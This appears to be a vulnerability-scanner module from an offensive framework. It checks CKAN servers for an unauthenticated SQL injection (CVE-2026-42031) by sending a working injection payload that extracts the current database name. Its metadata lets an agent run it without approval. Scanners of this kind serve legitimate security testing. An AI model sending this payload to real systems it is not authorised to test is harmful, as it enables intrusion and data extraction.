#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CKAN, an open-source data management system used for powering open data portals, contains an unauthenticated S."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'CKAN DataStore SQL Search - SQL Injection Detection',
        'description': 'CKAN, an open-source data management system used for powering open data portals, contains an unauthenticated SQL injection vulnerability in the datastore_search_sql API endpoint.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2026', 'ckan', 'sqli', 'datastore', 'unauth'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/advisories/GHSA-h7j7-3rx6-xvcg',
            'https://github.com/ckan/ckan/security/advisories/GHSA-h7j7-3rx6-xvcg',
        ],
        'cve': 'CVE-2026-42031',
    }

    def run(self):
        path = '/api/action/status_show'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('ckan_version', '"success": true',)
        if not (all(m in body for m in body_all)):
            return False
        path = "/api/action/datastore_search_sql?sql=SELECT+ts_rewrite('a'::tsquery,+'SELECT+''a''::tsquery,+(SELECT+current_database())::tsquery')"
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('"success": true', 'ts_rewrite', 'records',)
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='CKAN DataStore SQL Search - SQL Injection detected', path=path)
            return True
        return False

